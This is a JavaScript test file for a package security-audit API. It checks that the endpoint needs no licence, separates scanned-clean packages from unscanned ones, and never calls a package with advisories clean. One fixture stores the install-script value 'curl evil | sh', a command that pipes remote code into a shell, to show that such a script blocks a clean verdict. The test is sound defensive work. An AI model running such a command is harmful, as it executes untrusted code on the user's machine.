// node --test functions/api/security.test.mjs
//
// /api/security IS FREE. It used to be a paywall priced at $0.01 and it sold nothing: redact_paid()
// had already moved advisory detail and the install command into the public export, and
// /v0.1/lookup returns all of it per capability with no account. The tests that guarded the licence
// gate were NOT deleted with it — they are in history.test.mjs now, against the endpoint that is
// genuinely paid. What is tested here is that this one stays free, and that it can tell "scanned
// and clean" apart from "never scanned".

import { strict as assert } from "node:assert";
import test from "node:test";

import { bucketOf, onRequestGet } from "./security.js";

const KEY = "tashan-live-abcdef";
const ID = "pkg:mcp-server-taskwarrior";
const REC = {
  a: [{ id: "GHSA-95hg-3c55-xf9x", severity: "LOW", summary: "command injection", fixed: "1.2.0" }],
  s: "node ./scripts/post-install.js",
  t: "2026-07-30T18:35:34+00:00",
};

function kv(seed = {}) {
  // validate() caches its verdict, so the stub needs put/delete as well as get — without them the
  // gate throws before the handler is reached and every assertion below passes for the wrong reason.
  const m = new Map(Object.entries(seed));
  return {
    get: async (k) => (m.has(k) ? m.get(k) : null),
    put: async (k, v) => void m.set(k, v),
    delete: async (k) => void m.delete(k),
  };
}

const ENV = (over = {}) => ({
  POLAR_ORG_ID: "org_1",
  // sec:meta is what push_security writes last. Its presence is the difference between "we have no
  // record for this id" and "the paid store was never published" — every test below assumes a store
  // that HAS been published, which is the state a paying customer is entitled to.
  TASHAN_KV: kv({ ["sec:" + bucketOf(ID)]: { [ID]: REC },
                  "sec:meta": { shards: 1, capabilities: 1, pushed_at: "2026-08-08T00:00:00Z" } }),
  ...over,
});

// A store holding exactly one capability's record, sharded the way push_security.py shards it.
const kvWith = (id, rec) => kv({
  ["sec:" + bucketOf(id)]: { [id]: rec },
  "sec:meta": { shards: 1, capabilities: 1, pushed_at: "2026-08-14T15:20:52+00:00" },
});

function stubPolar(reply) {
  const real = globalThis.fetch;
  globalThis.fetch = async () => reply();
  return () => { globalThis.fetch = real; };
}
const granted = () => new Response(JSON.stringify({ status: "granted" }), { status: 200 });
const rejected = () => new Response("{}", { status: 404 });
const down = () => new Response("", { status: 502 });

const req = (q = "?id=" + encodeURIComponent(ID), headers = {}) =>
  new Request("https://tashan.sh/api/security" + q, { headers });

const withKey = (h = {}) => ({ authorization: "Bearer " + KEY, ...h });

// ---- free, and it must stay that way -----------------------------------------------------------

test("no licence needed — this endpoint is free", async () => {
  // The regression this locks out is re-gating it. Everything here is already public in
  // /data/lookup.json and /v0.1/lookup; a 402 would charge for data we publish for nothing.
  const r = await onRequestGet({ request: req(), env: ENV() });
  assert.equal(r.status, 200, "a caller with no credential must get the audit");
  const b = await r.json();
  assert.equal(b.advisories[0].id, "GHSA-95hg-3c55-xf9x");
  assert.equal(b.licence, "free");
});

test("no credential is required even when Polar is unreachable", async () => {
  // A free endpoint must not depend on the billing provider at all. If this ever starts failing,
  // the licence gate has been reintroduced.
  const un = stubPolar(down);
  try {
    const r = await onRequestGet({ request: req(), env: ENV() });
    assert.equal(r.status, 200);
  } finally { un(); }
});

test("an unconfigured deployment says so rather than pretending there is nothing", async () => {
  const r = await onRequestGet({ request: req(), env: { TASHAN_KV: null } });
  assert.equal(r.status, 503);
});

// ---- the payload --------------------------------------------------------------------------------

test("the audit carries what a caller needs in order to act", async () => {
  const un = stubPolar(granted);
  try {
    const r = await onRequestGet({ request: req(undefined, withKey()), env: ENV() });
    assert.equal(r.status, 200);
    const b = await r.json();
    // "which CVE or GHSA, its severity, the affected range, and the version that fixes it"
    assert.equal(b.advisories[0].id, "GHSA-95hg-3c55-xf9x");
    assert.equal(b.advisories[0].fixed, "1.2.0");
    // "what the install script actually runs"
    assert.equal(b.install_script, "node ./scripts/post-install.js");
    // permissions are NOT here: "what it can reach on your machine" is free, and gating it sold
    // the same fact twice. The endpoint must not start carrying it again.
    assert.equal(b.permissions, undefined);
  } finally { un(); }
});

test("free data is shared-cacheable — it is the same audit the dossier publishes", async () => {
  const r = await onRequestGet({ request: req(), env: ENV() });
  assert.match(r.headers.get("cache-control") || "", /public/);
});

test("a session cookie is harmless — it neither unlocks nor blocks anything", async () => {
  // This is the whole point of the endpoint: before it existed, capability.js never checked for a
  // licence and a paying customer saw exactly what a stranger saw on every page of the site.
  const un = stubPolar(granted);
  try {
    const r = await onRequestGet({
      request: req(undefined, { cookie: "tashan_s=" + KEY }), env: ENV(),
    });
    assert.equal(r.status, 200);
    assert.equal((await r.json()).install_script, "node ./scripts/post-install.js");
  } finally { un(); }
});

test("a capability with nothing recorded is a stated 404, never an implied clean scan", async () => {
  const un = stubPolar(granted);
  try {
    const r = await onRequestGet({
      request: req("?id=pkg:nothing-here", withKey()), env: ENV(),
    });
    assert.equal(r.status, 404);
    const b = await r.json();
    assert.equal(b.detail, null);
    // STRENGTHENED, not relaxed. This used to forbid the substring "clean" anywhere in the note,
    // which also forbids saying "unknown, NOT clean" — the sentence that most directly prevents the
    // misreading. What matters is that no clean scan is ASSERTED, and that the real state is named.
    assert.equal(b.scanned, false, "the 404 must state that nothing was scanned, not merely omit it");
    assert.ok(/has not been scanned/i.test(b.note), `must name the real state: ${b.note}`);
    assert.ok(!/\b(is clean|looks clean|no known (issues|vulnerabilit)|nothing found|clear of|is safe)\b/i
                .test(b.note), `asserts a clean scan it cannot support: ${b.note}`);
  } finally { un(); }
});

test("a scanned-clean capability is a 200 that says so — not a 404", async () => {
  // THE DEFECT THIS LOCKS OUT. The store only carried rows with a finding, so 7,366 of 7,862
  // scanned capabilities answered "no audit detail recorded" — including chrome-devtools-mcp and
  // @playwright/mcp, verified against a real Pro session. For a security-audit product, "we checked
  // it and found nothing" IS the thing being paid for; a 404 reads as having no coverage.
  const un = stubPolar(granted);
  try {
    const env = ENV();
    const id = "pkg:spotless";
    env.TASHAN_KV = kvWith(id, { t: "2026-08-14T15:20:52+00:00" });   // only a timestamp: clean
    const r = await onRequestGet({ request: req("?id=" + id, withKey()), env });
    assert.equal(r.status, 200, "a scanned-clean row must not 404");
    const b = await r.json();
    assert.equal(b.scanned, true);
    assert.equal(b.clean, true, "clean must be stated, not inferred from two empty fields");
    assert.deepEqual(b.advisories, []);
    assert.equal(b.install_script, null);
    // The DATE is the claim — a scan from six weeks ago is a different answer from one last night.
    assert.equal(b.scanned_at, "2026-08-14T15:20:52+00:00");
  } finally { un(); }
});

test("a row WITH findings is never reported as clean", async () => {
  const un = stubPolar(granted);
  try {
    const env = ENV();
    const id = "pkg:bad";
    env.TASHAN_KV = kvWith(id, { t: "2026-08-14T00:00:00+00:00",
                                 a: [{ id: "GHSA-x", severity: "HIGH" }] });
    const b = await (await onRequestGet({ request: req("?id=" + id, withKey()), env })).json();
    assert.equal(b.clean, false, "a row carrying an advisory must never say clean");
    assert.equal(b.advisories.length, 1);

    const id2 = "pkg:script";
    env.TASHAN_KV = kvWith(id2, { t: "2026-08-14T00:00:00+00:00", s: "curl evil | sh" });
    const b2 = await (await onRequestGet({ request: req("?id=" + id2, withKey()), env })).json();
    assert.equal(b2.clean, false, "an install script alone must also defeat clean");
  } finally { un(); }
});

test("a missing id is a 400 before any licence work happens", async () => {
  const r = await onRequestGet({ request: req(""), env: ENV() });
  assert.equal(r.status, 400);
});

// ---- the shard arithmetic, pinned to the Python side --------------------------------------------

test("bucketOf matches pipeline/push_security.py::bucket_of", () => {
  // Vectors computed with: sum(ord(c) for c in id) % 64
  const cases = {
    "pkg:tavily-mcp": 2,
    "pkg:mcp-server-taskwarrior": 38,
    "registry:io.github.foo/bar": 18,
    "skill:anthropics/pdf": 61,
    "": 0,
  };
  for (const [id, want] of Object.entries(cases)) {
    assert.equal(bucketOf(id), String(want), `bucketOf(${id})`);
  }
});

// THE MOST EXPENSIVE BUG THIS CODEBASE CAN HAVE: an unpublished paid store answering the same
// innocuous "no audit detail recorded for this id" as a capability we genuinely have nothing on.
// push_security.py skips without CF credentials, so the store can be entirely empty while every
// request a paying customer makes reads as thin coverage rather than an undelivered product. They
// would conclude tashan is useless and refund, and nothing anywhere would say otherwise.


// THE REGRESSION THIS PREVENTS, shipped and caught within the hour: sec:meta was introduced after
// 61 shards were already in KV, so "no manifest" was true of a perfectly healthy store. Reading it
// as "never published" told paying customers their product was undelivered when it was not.
test("a loaded store with no manifest yet is not called unpublished", async () => {
  const un = stubPolar(granted);
  try {
    const r = await onRequestGet({
      request: req("?id=pkg:nothing-here", withKey()),
      // shards present (this bucket has data), manifest absent — the state on the night sec:meta shipped
      env: ENV({ TASHAN_KV: kv({ ["sec:" + bucketOf(ID)]: { [ID]: REC } }) }),
    });
    assert.equal(r.status, 404, "an absent manifest is not evidence of an empty store");
    assert.equal((await r.json()).store_published_at, null, "diagnostic, not a verdict");
  } finally { un(); }
});
